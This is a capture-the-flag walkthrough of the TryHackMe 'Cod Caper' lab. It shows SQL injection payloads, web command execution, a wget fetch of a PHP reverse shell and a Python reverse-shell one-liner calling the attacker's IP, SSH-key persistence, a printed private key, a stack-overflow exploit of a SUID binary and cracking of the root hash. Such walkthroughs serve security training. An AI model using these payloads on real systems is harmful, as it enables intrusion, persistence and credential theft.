# The Cod Caper

URL: https://tryhackme.com/room/thecodcaper

Level: Easy

Date: 11 Jul 2023

- [Reconnaissance](#reconnaissance)
	- [NMAP](#nmap)
	- [Web Enumeration](#web-enumeration)
	- [SQLmap](#sqlmap)
	- [Command execution](#command-execution)
	- [Reverse Shell](#reverse-shell)
	- [Rabbit Hole](#rabbit-hole)
	- [Pingu password](#pingu-password)
	
- [Binary exploitation](#binary-exploitation)
- [Root flag](#root-flag)





## Reconnaissance

### nmap

```bash
$ sudo nmap -n -p- 10.10.173.15 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 19:59 CEST
Nmap scan report for 10.10.173.15
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 83.63 seconds
```

### nmap verbose

```bash
$ sudo nmap -n -p22,80 10.10.173.15 -oA nmap2 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 20:02 CEST
Nmap scan report for 10.10.173.15
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d2c401b6c157cfcbf9b5522612a56fc (RSA)
|   256 ff893298f4779c0939f5af4a4f08d6f5 (ECDSA)
|_  256 899263e71d2b3aaf6cf939565b557ef9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds
```

### web enumeration

```bash
$ gobuster dir -u http://10.10.173.15 -w  /opt/SecLists/Discovery/Web-Content/big.txt -x php,txt,html
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.173.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/07/11 20:10:42 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/administrator.php    (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
Progress: 81830 / 81908 (99.90%)
===============================================================
2023/07/11 20:19:06 Finished
===============================================================
```

### http

on `/administrator.php` we have a very simple login form:

![](Pasted%20image%2020230711201950.png)



We insert a single apex and we get an SQL error:


```html
Try Again  
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

So it is likely that this form is vulnerable to SQLi.


### sqlmap

Let's capture a request and use it again with `sqlmap`

```bash
POST http://10.10.173.15/administrator.php HTTP/1.1
Host: 10.10.173.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.173.15
Connection: keep-alive
Referer: http://10.10.173.15/administrator.php
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

(we replace `admin` with `*`)

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ sqlmap -r req.txt --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:25:55 /2023-07-11/
..
..
..
sqlmap identified the following injection point(s) with a total of 1092 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=' AND GTID_SUBSET(CONCAT(0x716b6a6a71,(SELECT (ELT(7077=7077,1))),0x716a786271),7077)-- kGED&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=' AND (SELECT 3332 FROM (SELECT(SLEEP(5)))uOtN)-- hoCW&password=admin
---
[20:27:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[20:27:44] [INFO] fetched data logged to text files under '/home/joshua/.local/share/sqlmap/output/10.10.173.15'
[20:27:44] [WARNING] your sqlmap version is outdated

[*] ending @ 20:27:44 /2023-07-11/
```

Let's move forward:

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ sqlmap -r req.txt --batch --dbms mysql --dump --dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
..
..
..
web server operating system: Linux Ubuntu 16.04 or 16.10 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.0
[20:30:31] [INFO] fetching database names
[20:30:31] [INFO] retrieved: 'information_schema'
[20:30:31] [INFO] retrieved: 'mysql'
[20:30:31] [INFO] retrieved: 'performance_schema'
[20:30:31] [INFO] retrieved: 'sys'
[20:30:31] [INFO] retrieved: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[20:30:31] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[20:30:31] [INFO] fetching current database
[20:30:31] [INFO] retrieved: 'users'
[20:30:31] [INFO] fetching tables for database: 'users'
[20:30:32] [INFO] retrieved: 'users'
[20:30:32] [INFO] fetching columns for table 'users' in database 'users'
[20:30:32] [INFO] retrieved: 'username'
[20:30:32] [INFO] retrieved: 'varchar(100)'
[20:30:32] [INFO] retrieved: 'password'
[20:30:32] [INFO] retrieved: 'varchar(100)'
[20:30:32] [INFO] fetching entries for table 'users' in database 'users'
[20:30:32] [INFO] retrieved: 'secretpass'
[20:30:32] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```

*How many forms of SQLI is the form vulnerable to?*

3

```bash
$ sqlmap   --forms -u "http://10.10.173.15/administrator.php" --dump
..
..
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=uSOS' RLIKE (SELECT (CASE WHEN (5376=5376) THEN 0x75534f53 ELSE 0x28 END))-- gNIB&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=uSOS' AND GTID_SUBSET(CONCAT(0x716b6a6a71,(SELECT (ELT(1719=1719,1))),0x716a786271),1719)-- XgmH&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=uSOS' AND (SELECT 8235 FROM (SELECT(SLEEP(5)))hidu)-- bPUC&password=
    ..
    ..
```

### command execution

![](Pasted%20image%2020230711203925.png)

```html
$ curl -s http://10.10.173.15/2591c98b70119fe624898b1e424b5e91.php -X POST -d "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Login</title>
</head>
<body>

<h1>Run Command</h1>

<form action="2591c98b70119fe624898b1e424b5e91.php" method="POST">
<p>Command: </p> <input type="text" name="cmd">

</form>


</body>
</html>

```

We see 3 files:

```html
$ curl -s http://10.10.173.15/2591c98b70119fe624898b1e424b5e91.php -X POST -d "cmd=ls"
2591c98b70119fe624898b1e424b5e91.php
administrator.php
index.html
index.html<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Login</title>
</head>
<body>

<h1>Run Command</h1>

<form action="2591c98b70119fe624898b1e424b5e91.php" method="POST">
<p>Command: </p> <input type="text" name="cmd">

</form>


</body>
</html>
```


`/etc/passwd`

```bash
$ curl -s http://10.10.173.15/2591c98b70119fe624898b1e424b5e91.php -X POST -d "cmd=cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
papa:x:1000:1000:qaa:/home/papa:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
pingu:x:1002:1002::/home/pingu:/bin/bash
pingu:x:1002:1002::/home/pingu:/bin/bash
```

### reverse shell


Let's use `php-reverse-shell.php`

Start Python web server:

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

we run this code on web form

```bash
wget http://10.8.100.14:8080/php-reverse-shell.php
```

we get our shell

```bash
10.10.173.15 - - [11/Jul/2023 20:47:49] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

Spawn our listener:

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ nc -nlvp 4444
listening on [any] 4444 ...
```


Mm, it seems we aren't able to write to current path!

Let's try a Python reverse shell from here:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

```python
export RHOST="10.8.100.14";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Got a shell!

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.173.15] 42958
$
```

Upgrade shell:

```bash
$ python -c 'import pty;pty.spawn("/bin/bash");'
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@ubuntu:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 4444
joshua@kaligra:~/Documents/thm/the_cod_caper$ stty raw -echo
joshua@kaligra:~/Documents/thm/the_cod_caper$
nc -nlvp 4444

www-data@ubuntu:/var/www/html$
www-data@ubuntu:/var/www/html$
```

Let's find all files owned by `pingu`

```bash
www-data@ubuntu:/var/www/html$ find / -type f -user pingu 2> /dev/null
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/home/pingu/.gdb_history
/home/pingu/.pwntools-cache-2.7/update
```

### rabbit hole

We can read `pingu`'s private key (not good!)

```bash
www-data@ubuntu:/var/www/html$ cat /home/pingu/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArfwVtcBusqBrJ02SfHLEcpbFcrxUVFezLYEUUFTHRnTwUnsU
aHa3onWWNQKVoOwtr3iaqsandQoNDAaUNocbxnNoJaIAg40G2FEI49wW1Xc9porU
x8haIBCI3LSjBd7GDhyh4T6+o5K8jDfXmNElyp7d5CqPRQHNcSi8lw9pvFqaxUuB
ZYD7XeIR8i08IdivdH2hHaFR32u3hWqcQNWpmyYx4JhdYRdgdlc6U02ahCYhyvYe
LKIgaqWxUjkOOXRyTBXen/A+J9cnwuM3Njx+QhDo6sV7PDBIMx+4SBZ2nKHKFjzY
y2RxhNkZGvL0N14g3udz/qLQFWPICOw218ybaQIDAQABAoIBAClvd9wpUDPKcLqT
hueMjaycq7l/kLXljQ6xRx06k5r8DqAWH+4hF+rhBjzpuKjylo7LskoptYfyNNlA
V9wEoWDJ62vLAURTOeYapntd1zJPi6c2OSa7WHt6dJ3bh1fGjnSd7Q+v2ccrEyxx
wC7s4Is4+q90U1qj60Gf6gov6YapyLHM/yolmZlXunwI3dasEh0uWFd91pAkVwTb
FtzCVthL+KXhB0PSQZQJlkxaOGQ7CDT+bAE43g/Yzl309UQSRLGRxIcEBHRZhTRS
M+jykCBRDJaYmu+hRAuowjRfBYg2xqvAZU9W8ZIkfNjoVE2i+KwVwxITjFZkkqMI
jgL0oAECgYEA3339Ynxj2SE5OfD4JRfCRHpeQOjVzm+6/8IWwHJXr7wl/j49s/Yw
3iemlwJA7XwtDVwxkxvsfHjJ0KvTrh+mjIyfhbyj9HjUCw+E3WZkUMhqefyBJD1v
tTxWWgw3DKaXHqePmu+srUGiVRIua4opyWxuOv0j0g3G17HhlYKL94ECgYEAx0qf
ltrdTUrwr8qRLAqUw8n1jxXbr0uPAmeS6XSXHDTE4It+yu3T606jWNIGblX9Vk1U
mcRk0uhuFIAG2RBdTXnP/4SNUD0FDgo+EXX8xNmMgOm4cJQBdxDRzQa16zhdnZ0C
xrg4V5lSmZA6R38HXNeqcSsdIdHM0LlE31cL1+kCgYBTtLqMgo5bKqhmXSxzqBxo
zXQz14EM2qgtVqJy3eCdv1hzixhNKO5QpoUslfl/eTzefiNLN/AxBoSAFXspAk28
4oZ07pxx2jeBFQTsb4cvAoFuwvYTfrcyKDEndN/Bazu6jYOpwg7orWaBelfMi2jv
Oh9nFJyv9dz9uHAHMWf/AQKBgFh/DKsCeW8PLh4Bx8FU2Yavsfld7XXECbc5owVE
Hq4JyLsldqJKReahvut8KBrq2FpwcHbvvQ3i5K75wxC0sZnr069VfyL4VbxMVA+Q
4zPOnxPHtX1YW+Yxc9ileDcBiqCozkjMGUjc7s7+OsLw56YUpr0mNgOElHzDKJA8
qSexAoGAD4je4calnfcBFzKYkLqW3nfGIuC/4oCscYyhsmSySz5MeLpgx2OV9jpy
t2T6oJZYnYYwiZVTZWoEwKxUnwX/ZN73RRq/mBX7pbwOBBoINejrMPiA1FRo/AY3
pOq0JjdnM+KJtB4ae8UazL0cSJ52GYbsNABrcGEZg6m5pDJD3MM=
-----END RSA PRIVATE KEY-----

```

Let's access through ssh:

```bash
joshua@kaligra:~/Documents/thm/the_cod_caper$ ssh -i pingu.rsa pingu@10.10.173.15
The authenticity of host '10.10.173.15 (10.10.173.15)' can't be established.
ED25519 key fingerprint is SHA256:+hK0Xg1iyvZJUoO07v4g1UZ11QpuwY05deZS4BPEbbE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.173.15' (ED25519) to the list of known hosts.
pingu@10.10.173.15's password:
```

It is still asking for a password...

```bash
www-data@ubuntu:/home/pingu/.ssh$ ls -la
total 16
drwxrwxrwx 2 pingu pingu 4096 Jan 15  2020 .
drwxrwxrwx 6 pingu pingu 4096 Jan 20  2020 ..
-rwxrwxrwx 1 pingu pingu 1675 Jan 15  2020 id_rsa
-rwxrwxrwx 1 pingu pingu  394 Jan 15  2020 id_rsa.pub
```

Probably we need to add OUR public key to `authorized_keys`

```bash
$ ssh-keygen -f sugo -b 1024
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in sugo
Your public key has been saved in sugo.pub
The key fingerprint is:
SHA256:z/rDigSXzfC98XkNNyZj/A/+H17ypO0bw0EVwINnxu4 joshua@kaligra
The key's randomart image is:
+---[RSA 1024]----+
|            +...o|
|           . B  .|
|      .     = .. |
|       * .  ...  |
|    . o S o .=.+.|
|     o   o +.E*+o|
|      .  .+ o +*+|
|     . . .o  o.B*|
|      . oo..  o=X|
+----[SHA256]-----+
```

```bash
www-data@ubuntu:/home/pingu/.ssh$ cat > authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC65tREERENW2mV+uw+TmusUca2qhGh3PUDtH3YepZxluVs0atQARnAIBpjhZxHlriXFojipuJoc7qiHCQRP9DJxLLNzo2/rZ3bttSBH0xKScVqkjk/CSoN0m1x3k1WTQf1l/aAUYC+OzLnRNwnL6nZQXI4KNwxNDjL6PWS+5zgJw== joshua@kaligra
```

### pingu password

Founded through `linpeas`:

```bash
..
..
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/pingu
/home/pingu/.cache
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.nano
/home/pingu/.pwntools-cache-2.7
/home/pingu/.pwntools-cache-2.7/update
/home/pingu/.ssh
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/opt
/opt/secret
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/hidden/pass
/var/lib/php/sessions
/var/tmp
```

```bash
www-data@ubuntu:/opt/secret$ cat /var/hidden/pass
pinguapingu
```

We also found an interesting suid file:

```bash
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-r-sr-xr-x 1 root papa 7.4K Jan 16  2020 /opt/secret/root (Unknown SUID binary)
```

```bash
pingu@ubuntu:~$ strings /opt/secret/root
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
setuid
__isoc99_scanf
system
setgid
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.0
PTRh
QVh!
UWVS
t$,U
[^_]
cat /var/backups/shadow.bak <=================
..
..
```

It seems that we can abuse this file for reading `/var/backups/shadow.bak`


## binary exploitation

```c
pingu@ubuntu:~$ gdb /opt/secret/root
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
pwndbg>
```

Overwriting EIP:

```c
pwndbg> r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────
 EAX  0x1
 EBX  0x0
 ECX  0x1
 EDX  0xf76f787c (_IO_stdfile_0_lock) ◂— 0
 EDI  0xf76f6000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf76f6000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x6161616b ('kaaa')
 ESP  0xfffe71b0 ◂— 0xf700616d /* 'ma' */
 EIP  0x6161616c ('laaa')
..
..
```

```c
`cyclic -l 0x6161616c`
44
```

This means that we need 44 characters to reach EIP.

We want to overwrite EIP with a call to shell:

```c
pwndbg> disassemble shell
Dump of assembler code for function shell:
   0x080484cb <+0>:     push   ebp
   0x080484cc <+1>:     mov    ebp,esp
   0x080484ce <+3>:     sub    esp,0x8
   0x080484d1 <+6>:     sub    esp,0xc
   0x080484d4 <+9>:     push   0x3e8
   0x080484d9 <+14>:    call   0x80483a0 <setuid@plt>
   0x080484de <+19>:    add    esp,0x10
   0x080484e1 <+22>:    sub    esp,0xc
   0x080484e4 <+25>:    push   0x3e8
   0x080484e9 <+30>:    call   0x8048370 <setgid@plt>
   0x080484ee <+35>:    add    esp,0x10
   0x080484f1 <+38>:    sub    esp,0xc
   0x080484f4 <+41>:    push   0x80485d0
   0x080484f9 <+46>:    call   0x8048380 <system@plt>
   0x080484fe <+51>:    add    esp,0x10
   0x08048501 <+54>:    nop
   0x08048502 <+55>:    leave
   0x08048503 <+56>:    ret
End of assembler dump.
```


Reading `/var/backups/shadow.bak`

```bash
pingu@ubuntu:~$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault

```


## root flag

Let's crack `root`'s hash

```bash
$ hashcat -m 1800 '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' /usr/share/wordlists/rockyou.txt
..
..
..
Session..........: hashcat
Status...........: Running
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
Time.Started.....: Wed Jul 12 12:12:45 2023 (6 mins, 57 secs)
Time.Estimated...: Wed Jul 12 19:09:20 2023 (6 hours, 49 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      574 H/s (11.04ms) @ Accel:128 Loops:256 Thr:1 Vec:4
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 239360/14344385 (1.67%)
Rejected.........: 0/239360 (0.00%)
Restore.Point....: 239360/14344385 (1.67%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2304-2560
Candidate.Engine.: Device Generator
Candidates.#1....: majho -> lyserg
Hardware.Mon.#1..: Util: 98%

$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
```

